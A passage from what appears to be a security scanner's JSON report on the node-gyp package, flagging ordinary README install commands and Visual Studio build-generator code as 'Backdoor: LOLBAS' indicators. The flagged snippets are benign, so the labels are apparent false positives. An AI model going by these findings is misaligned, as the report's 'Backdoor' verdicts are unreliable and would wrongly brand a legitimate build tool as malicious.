                      "text": "### On Windows\n\nInstall tools with [Chocolatey](https://chocolatey.org):\n``` bash\nchoco install python visualstudio2022-workload-vctools -y\n```\n\nOr install and configure Python and Visual Studio tools manually:\n",
                      "markdown": "`### On Windows\n\nInstall tools with [Chocolatey](https://chocolatey.org):\n``` bash\nchoco install python visualstudio2022-workload-vctools -y\n```\n\nOr install and configure Python and Visual Studio tools manually:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 3,
                  "endLine": 30,
                  "snippet": {
                    "text": "\nYou can install `node-gyp` using `npm`:\n\n``` bash\nnpm install -g node-gyp\n```\n\nDepending on your operating system, you will need to install:\n",
                    "rendered": {
                      "text": "\nYou can install `node-gyp` using `npm`:\n\n``` bash\nnpm install -g node-gyp\n```\n\nDepending on your operating system, you will need to install:\n",
                      "markdown": "`\nYou can install `node-gyp` using `npm`:\n\n``` bash\nnpm install -g node-gyp\n```\n\nDepending on your operating system, you will need to install:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 230,
                  "startColumn": 57,
                  "endLine": 230,
                  "endColumn": 63,
                  "snippet": {
                    "text": "| `--proxy=$url`                    | Set HTTP(S) proxy for downloading header tarball\n| `--noproxy=$urls`                 | Set urls to ignore proxies when downloading header tarball\n| `--cafile=$cafile`                | Override default CA chain (to download tarball)\n| `--nodedir=$path`                 | Set the path to the node source code\n| `--python=$path`                  | Set path to the Python binary\n| `--msvs_version=$version`         | Set Visual Studio version (Windows only)\n| `--solution=$solution`            | Set Visual Studio Solution version (Windows only)\n",
                    "rendered": {
                      "text": "| `--proxy=$url`                    | Set HTTP(S) proxy for downloading header tarball\n| `--noproxy=$urls`                 | Set urls to ignore proxies when downloading header tarball\n| `--cafile=$cafile`                | Override default CA chain (to download tarball)\n| `--nodedir=$path`                 | Set the path to the node source code\n| `--python=$path`                  | Set path to the Python binary\n| `--msvs_version=$version`         | Set Visual Studio version (Windows only)\n| `--solution=$solution`            | Set Visual Studio Solution version (Windows only)\n",
                      "markdown": "`| `--proxy=$url`                    | Set HTTP(S) proxy for downloading header tarball\n| `--noproxy=$urls`                 | Set urls to ignore proxies when downloading header tarball\n| `--cafile=$cafile`                | Override default CA chain (to download tarball)\n| `--nodedir=$path`                 | Set the path to the node source code\n| `--python=$path`                  | Set path to the Python binary\n| `--msvs_version=$version`         | Set Visual Studio version (Windows only)\n| `--solution=$solution`            | Set Visual Studio Solution version (Windows only)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 17,
                  "endLine": 185,
                  "endColumn": 23,
                  "snippet": {
                    "text": "Some additional resources for Node.js native addons and writing `gyp` configuration files:\n\n * [\"Going Native\" a nodeschool.io tutorial](http://nodeschool.io/#goingnative)\n * [\"Hello World\" node addon example](https://github.com/nodejs/node/tree/main/test/addons/hello-world)\n * [gyp user documentation](https://gyp.gsrc.io/docs/UserDocumentation.md)\n * [gyp input format reference](https://gyp.gsrc.io/docs/InputFormatReference.md)\n * [*\"binding.gyp\" files out in the wild* wiki page](./docs/binding.gyp-files-in-the-wild.md)\n",
                    "rendered": {
                      "text": "Some additional resources for Node.js native addons and writing `gyp` configuration files:\n\n * [\"Going Native\" a nodeschool.io tutorial](http://nodeschool.io/#goingnative)\n * [\"Hello World\" node addon example](https://github.com/nodejs/node/tree/main/test/addons/hello-world)\n * [gyp user documentation](https://gyp.gsrc.io/docs/UserDocumentation.md)\n * [gyp input format reference](https://gyp.gsrc.io/docs/InputFormatReference.md)\n * [*\"binding.gyp\" files out in the wild* wiki page](./docs/binding.gyp-files-in-the-wild.md)\n",
                      "markdown": "`Some additional resources for Node.js native addons and writing `gyp` configuration files:\n\n * [\"Going Native\" a nodeschool.io tutorial](http://nodeschool.io/#goingnative)\n * [\"Hello World\" node addon example](https://github.com/nodejs/node/tree/main/test/addons/hello-world)\n * [gyp user documentation](https://gyp.gsrc.io/docs/UserDocumentation.md)\n * [gyp input format reference](https://gyp.gsrc.io/docs/InputFormatReference.md)\n * [*\"binding.gyp\" files out in the wild* wiki page](./docs/binding.gyp-files-in-the-wild.md)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 3,
                  "endLine": 149,
                  "snippet": {
                    "text": "Now you will have either a `Makefile` (on Unix platforms) or a `vcxproj` file\n(on Windows) in the `build/` directory. Next, invoke the `build` command:\n\n``` bash\nnode-gyp build\n```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\n",
                    "rendered": {
                      "text": "Now you will have either a `Makefile` (on Unix platforms) or a `vcxproj` file\n(on Windows) in the `build/` directory. Next, invoke the `build` command:\n\n``` bash\nnode-gyp build\n```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\n",
                      "markdown": "`Now you will have either a `Makefile` (on Unix platforms) or a `vcxproj` file\n(on Windows) in the `build/` directory. Next, invoke the `build` command:\n\n``` bash\nnode-gyp build\n```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 3,
                  "endLine": 139,
                  "snippet": {
                    "text": "\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\nneeds to be added (not needed when run by npm as configured above):\n``` bash\nnode-gyp configure --msvs_version=2015\n```\n\n__Note__: The `configure` step looks for a `binding.gyp` file in the current\n",
                    "rendered": {
                      "text": "\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\nneeds to be added (not needed when run by npm as configured above):\n``` bash\nnode-gyp configure --msvs_version=2015\n```\n\n__Note__: The `configure` step looks for a `binding.gyp` file in the current\n",
                      "markdown": "`\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\nneeds to be added (not needed when run by npm as configured above):\n``` bash\nnode-gyp configure --msvs_version=2015\n```\n\n__Note__: The `configure` step looks for a `binding.gyp` file in the current\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 3,
                  "endLine": 133,
                  "snippet": {
                    "text": "The next step is to generate the appropriate project build files for the current\nplatform. Use `configure` for that:\n\n``` bash\nnode-gyp configure\n```\n\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\n",
                    "rendered": {
                      "text": "The next step is to generate the appropriate project build files for the current\nplatform. Use `configure` for that:\n\n``` bash\nnode-gyp configure\n```\n\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\n",
                      "markdown": "`The next step is to generate the appropriate project build files for the current\nplatform. Use `configure` for that:\n\n``` bash\nnode-gyp configure\n```\n\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 3,
                  "endLine": 126,
                  "snippet": {
                    "text": "\nTo compile your native addon first go to its root directory:\n\n``` bash\ncd my_node_addon\n```\n\nThe next step is to generate the appropriate project build files for the current\n",
                    "rendered": {
                      "text": "\nTo compile your native addon first go to its root directory:\n\n``` bash\ncd my_node_addon\n```\n\nThe next step is to generate the appropriate project build files for the current\n",
                      "markdown": "`\nTo compile your native addon first go to its root directory:\n\n``` bash\ncd my_node_addon\n```\n\nThe next step is to generate the appropriate project build files for the current\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 3,
                  "endLine": 88,
                  "snippet": {
                    "text": "2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\nPython installed, then you can set the `npm_config_python` environment variable\nto the appropriate path:\n``` bash\nexport npm_config_python=/path/to/executable/python\n```\n&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\n",
                    "rendered": {
                      "text": "2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\nPython installed, then you can set the `npm_config_python` environment variable\nto the appropriate path:\n``` bash\nexport npm_config_python=/path/to/executable/python\n```\n&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\n",
                      "markdown": "`2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\nPython installed, then you can set the `npm_config_python` environment variable\nto the appropriate path:\n``` bash\nexport npm_config_python=/path/to/executable/python\n```\n&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 3,
                  "endLine": 81,
                  "snippet": {
                    "text": "\n1. by setting the `--python` command-line option, e.g.:\n\n``` bash\nnode-gyp <command> --python /path/to/executable/python\n```\n\n2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\n",
                    "rendered": {
                      "text": "\n1. by setting the `--python` command-line option, e.g.:\n\n``` bash\nnode-gyp <command> --python /path/to/executable/python\n```\n\n2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\n",
                      "markdown": "`\n1. by setting the `--python` command-line option, e.g.:\n\n``` bash\nnode-gyp <command> --python /path/to/executable/python\n```\n\n2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 3,
                  "endLine": 53,
                  "snippet": {
                    "text": "### On Windows\n\nInstall tools with [Chocolatey](https://chocolatey.org):\n``` bash\nchoco install python visualstudio2022-workload-vctools -y\n```\n\nOr install and configure Python and Visual Studio tools manually:\n",
                    "rendered": {
                      "text": "### On Windows\n\nInstall tools with [Chocolatey](https://chocolatey.org):\n``` bash\nchoco install python visualstudio2022-workload-vctools -y\n```\n\nOr install and configure Python and Visual Studio tools manually:\n",
                      "markdown": "`### On Windows\n\nInstall tools with [Chocolatey](https://chocolatey.org):\n``` bash\nchoco install python visualstudio2022-workload-vctools -y\n```\n\nOr install and configure Python and Visual Studio tools manually:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 3,
                  "endLine": 30,
                  "snippet": {
                    "text": "\nYou can install `node-gyp` using `npm`:\n\n``` bash\nnpm install -g node-gyp\n```\n\nDepending on your operating system, you will need to install:\n",
                    "rendered": {
                      "text": "\nYou can install `node-gyp` using `npm`:\n\n``` bash\nnpm install -g node-gyp\n```\n\nDepending on your operating system, you will need to install:\n",
                      "markdown": "`\nYou can install `node-gyp` using `npm`:\n\n``` bash\nnpm install -g node-gyp\n```\n\nDepending on your operating system, you will need to install:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3922,
                  "startColumn": 31,
                  "endLine": 3923,
                  "snippet": {
                    "text": "            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n        description = \", and also \".join(descriptions)\n\n",
                    "rendered": {
                      "text": "            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n        description = \", and also \".join(descriptions)\n\n",
                      "markdown": "`            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n        description = \", and also \".join(descriptions)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3922,
                  "startColumn": 15,
                  "endLine": 3922,
                  "endColumn": 20,
                  "snippet": {
                    "text": "            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n        description = \", and also \".join(descriptions)\n",
                    "rendered": {
                      "text": "            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n        description = \", and also \".join(descriptions)\n",
                      "markdown": "`            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n        description = \", and also \".join(descriptions)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3916,
                  "startColumn": 15,
                  "endLine": 3916,
                  "endColumn": 20,
                  "snippet": {
                    "text": "            descriptions.append(action[\"description\"])\n            cmd = action[\"command\"]\n            if generator_supports_multiple_toolsets:\n                cmd = cmd.replace(\".exe\", \"_host.exe\")\n            # For most actions, add 'call' so that actions that invoke batch files\n            # return and continue executing.  msbuild_use_call provides a way to\n            # disable this but I have not seen any adverse effect from doing that\n",
                    "rendered": {
                      "text": "            descriptions.append(action[\"description\"])\n            cmd = action[\"command\"]\n            if generator_supports_multiple_toolsets:\n                cmd = cmd.replace(\".exe\", \"_host.exe\")\n            # For most actions, add 'call' so that actions that invoke batch files\n            # return and continue executing.  msbuild_use_call provides a way to\n            # disable this but I have not seen any adverse effect from doing that\n",
                      "markdown": "`            descriptions.append(action[\"description\"])\n            cmd = action[\"command\"]\n            if generator_supports_multiple_toolsets:\n                cmd = cmd.replace(\".exe\", \"_host.exe\")\n            # For most actions, add 'call' so that actions that invoke batch files\n            # return and continue executing.  msbuild_use_call provides a way to\n            # disable this but I have not seen any adverse effect from doing that\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3914,
                  "startColumn": 11,
                  "endLine": 3914,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            inputs.update(OrderedSet(action[\"inputs\"]))\n            outputs.update(OrderedSet(action[\"outputs\"]))\n            descriptions.append(action[\"description\"])\n            cmd = action[\"command\"]\n            if generator_supports_multiple_toolsets:\n                cmd = cmd.replace(\".exe\", \"_host.exe\")\n            # For most actions, add 'call' so that actions that invoke batch files\n",
                    "rendered": {
                      "text": "            inputs.update(OrderedSet(action[\"inputs\"]))\n            outputs.update(OrderedSet(action[\"outputs\"]))\n            descriptions.append(action[\"description\"])\n            cmd = action[\"command\"]\n            if generator_supports_multiple_toolsets:\n                cmd = cmd.replace(\".exe\", \"_host.exe\")\n            # For most actions, add 'call' so that actions that invoke batch files\n",
                      "markdown": "`            inputs.update(OrderedSet(action[\"inputs\"]))\n            outputs.update(OrderedSet(action[\"outputs\"]))\n            descriptions.append(action[\"description\"])\n            cmd = action[\"command\"]\n            if generator_supports_multiple_toolsets:\n                cmd = cmd.replace(\".exe\", \"_host.exe\")\n            # For most actions, add 'call' so that actions that invoke batch files\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3836,
                  "startColumn": 11,
                  "endLine": 3836,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  Arguments:\n    spec: The gyp target spec.\n  Returns:\n    List of MSBuild 'Target' specs.\n  \"\"\"\n    build_cmd = _BuildCommandLineForRuleRaw(\n        spec, spec[\"msvs_external_builder_build_cmd\"], False, False, False, False\n",
                    "rendered": {
                      "text": "  Arguments:\n    spec: The gyp target spec.\n  Returns:\n    List of MSBuild 'Target' specs.\n  \"\"\"\n    build_cmd = _BuildCommandLineForRuleRaw(\n        spec, spec[\"msvs_external_builder_build_cmd\"], False, False, False, False\n",
                      "markdown": "`  Arguments:\n    spec: The gyp target spec.\n  Returns:\n    List of MSBuild 'Target' specs.\n  \"\"\"\n    build_cmd = _BuildCommandLineForRuleRaw(\n        spec, spec[\"msvs_external_builder_build_cmd\"], False, False, False, False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3827,
                  "startColumn": 23,
                  "endLine": 3827,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n\ndef _GetMSBuildExternalBuilderTargets(spec):\n    \"\"\"Return a list of MSBuild targets for external builders.\n\n  The \"Build\" and \"Clean\" targets are always generated.  If the spec contains\n  'msvs_external_builder_clcompile_cmd', then the \"ClCompile\" target will also\n",
                    "rendered": {
                      "text": "\n\ndef _GetMSBuildExternalBuilderTargets(spec):\n    \"\"\"Return a list of MSBuild targets for external builders.\n\n  The \"Build\" and \"Clean\" targets are always generated.  If the spec contains\n  'msvs_external_builder_clcompile_cmd', then the \"ClCompile\" target will also\n",
                      "markdown": "`\n\ndef _GetMSBuildExternalBuilderTargets(spec):\n    \"\"\"Return a list of MSBuild targets for external builders.\n\n  The \"Build\" and \"Clean\" targets are always generated.  If the spec contains\n  'msvs_external_builder_clcompile_cmd', then the \"ClCompile\" target will also\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3475,
                  "startColumn": 56,
                  "endLine": 3475,
                  "endColumn": 60,
                  "snippet": {
                    "text": "def _VerifySourcesExist(sources, root_dir):\n    \"\"\"Verifies that all source files exist on disk.\n\n  Checks that all regular source files, i.e. not created at run time,\n  exist on disk.  Missing files cause needless recompilation but no otherwise\n  visible errors.\n\n",
                    "rendered": {
                      "text": "def _VerifySourcesExist(sources, root_dir):\n    \"\"\"Verifies that all source files exist on disk.\n\n  Checks that all regular source files, i.e. not created at run time,\n  exist on disk.  Missing files cause needless recompilation but no otherwise\n  visible errors.\n\n",
                      "markdown": "`def _VerifySourcesExist(sources, root_dir):\n    \"\"\"Verifies that all source files exist on disk.\n\n  Checks that all regular source files, i.e. not created at run time,\n  exist on disk.  Missing files cause needless recompilation but no otherwise\n  visible errors.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3366,
                  "startColumn": 57,
                  "endLine": 3366,
                  "endColumn": 66,
                  "snippet": {
                    "text": "            value = configuration.get(ignored_setting)\n            if value:\n                print(\n                    \"Warning: The automatic conversion to MSBuild does not handle \"\n                    \"%s.  Ignoring setting of %s\" % (ignored_setting, str(value))\n                )\n\n",
                    "rendered": {
                      "text": "            value = configuration.get(ignored_setting)\n            if value:\n                print(\n                    \"Warning: The automatic conversion to MSBuild does not handle \"\n                    \"%s.  Ignoring setting of %s\" % (ignored_setting, str(value))\n                )\n\n",
                      "markdown": "`            value = configuration.get(ignored_setting)\n            if value:\n                print(\n                    \"Warning: The automatic conversion to MSBuild does not handle \"\n                    \"%s.  Ignoring setting of %s\" % (ignored_setting, str(value))\n                )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2370,
                  "startColumn": 52,
                  "endLine": 2370,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n\nclass MSBuildRule:\n    \"\"\"Used to store information used to generate an MSBuild rule.\n\n  Attributes:\n    rule_name: The rule name, sanitized to use in XML.\n",
                    "rendered": {
                      "text": "\n\nclass MSBuildRule:\n    \"\"\"Used to store information used to generate an MSBuild rule.\n\n  Attributes:\n    rule_name: The rule name, sanitized to use in XML.\n",
                      "markdown": "`\n\nclass MSBuildRule:\n    \"\"\"Used to store information used to generate an MSBuild rule.\n\n  Attributes:\n    rule_name: The rule name, sanitized to use in XML.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2328,
                  "startColumn": 5,
                  "endLine": 2328,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    rule_dependencies,\n    extension_to_rule_name,\n):\n    # MSBuild rules are implemented using three files: an XML file, a .targets\n    # file and a .props file.\n    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n",
                    "rendered": {
                      "text": "    rule_dependencies,\n    extension_to_rule_name,\n):\n    # MSBuild rules are implemented using three files: an XML file, a .targets\n    # file and a .props file.\n    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n",
                      "markdown": "`    rule_dependencies,\n    extension_to_rule_name,\n):\n    # MSBuild rules are implemented using three files: an XML file, a .targets\n    # file and a .props file.\n    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1795,
                  "startColumn": 15,
                  "endLine": 1795,
                  "endColumn": 20,
                  "snippet": {
                    "text": "                )\n            else:\n                fix_dst = _FixPath(cpy[\"destination\"])\n                cmd = (\n                    f'mkdir \"{fix_dst}\" 2>nul & set ERRORLEVEL=0 & '\n                    f'copy /Y \"{_FixPath(src)}\" \"{_FixPath(dst)}\"'\n                )\n",
